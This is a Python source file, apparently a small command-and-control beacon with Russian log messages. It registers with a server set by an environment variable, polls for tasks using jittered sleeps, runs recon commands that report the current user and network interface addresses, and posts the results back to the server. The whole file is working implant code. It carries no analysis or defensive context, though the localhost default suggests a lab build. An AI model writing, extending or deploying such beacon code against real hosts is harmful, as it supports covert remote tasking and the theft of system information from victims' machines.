import os
import random
import socket
import subprocess
import time
from pathlib import Path
import psutil
import requests

SERVER_URL = os.environ.get("BOT_SERVER", "http://127.0.0.1:5000")
PAYLOAD_UUID = os.environ.get("BOT_PAYLOAD", "550e8400-e29b-41d4-a716-446655440000")
SLEEP = float(os.environ.get("BOT_SLEEP", "5"))
JITTER = float(os.environ.get("BOT_JITTER", "0.3"))


def next_sleep(sleep=SLEEP, jitter=JITTER):
    jitter = min(max(jitter, 0.0), 1.0)
    delay = random.uniform(sleep * (1 - jitter), sleep * (1 + jitter))
    return max(0.1, delay)


def checkin():
    response = requests.post(
        f"{SERVER_URL}/checkin",
        json={"payload_uuid": PAYLOAD_UUID},
        timeout=5
    )
    response.raise_for_status()
    data = response.json()
    return data["callback_uuid"]


def get_task(callback_uuid):
    response = requests.post(
        f"{SERVER_URL}/poll",
        json={"callback_uuid": callback_uuid},
        timeout=5
    )
    response.raise_for_status()
    return response.json()["task"]


def execute(command):
    if command == "whoami":
        program = str(Path(os.environ["SystemRoot"]) / "System32" / "whoami.exe") if os.name == "nt" else "whoami"
        return subprocess.check_output(
            [program], encoding="oem" if os.name == "nt" else "utf-8",
            errors="replace", timeout=5
        ).strip()
    if command == "ip":
        lines = []
        for name, addresses in psutil.net_if_addrs().items():
            for address in addresses:
                if address.family in (socket.AF_INET, socket.AF_INET6):
                    lines.append(f"{name}: {address.address}")
        return "\n".join(lines) or "IP адресов не нашёл"
    if command == "exit":
        return "Выхожу"
    raise ValueError("дай норм команду")


def send_result(callback_uuid, task_id, result):
    response = requests.post(
        f"{SERVER_URL}/results",
        json={"callback_uuid": callback_uuid, "task_id": task_id, "result": result},
        timeout=5
    )
    response.raise_for_status()


def run(callback_uuid):
    pending = None
    while True:
        try:
            if pending is None:
                task = get_task(callback_uuid)
                if task is not None:
                    print("Задача:", task["task_id"], task["command"], flush=True)
                    try:
                        result = execute(task["command"])
                    except (OSError, ValueError, subprocess.SubprocessError) as error:
                        result = f"Ошибка: {error}"
                    pending = {"task": task, "result": result[:20000]}
            if pending is not None:
                task = pending["task"]
                send_result(callback_uuid, task["task_id"], pending["result"])
                print("Отдал результат:", task["task_id"], flush=True)
                if task["command"] == "exit":
                    print("Вышел", flush=True)
                    return
                pending = None
        except requests.RequestException as error:
            if error.response is not None and 400 <= error.response.status_code < 500:
                print("Сервер отказал:", error.response.text, flush=True)
                return
            print("Связь пропала, попробую ещё:", error, flush=True)
        delay = next_sleep()
        print(f"Сплю {delay:.2f} сек", flush=True)
        time.sleep(delay)


if __name__ == "__main__":
    try:
        callback_uuid = checkin()
        print("ЮИД:", callback_uuid, flush=True)
        run(callback_uuid)
    except requests.RequestException as error:
        print("Не смог зарегистрироваться:", error)
    except (KeyError, ValueError) as error:
        print("Сервер прислал непонятный ответ:", error)
    except KeyboardInterrupt:
        print("\nОстановил")
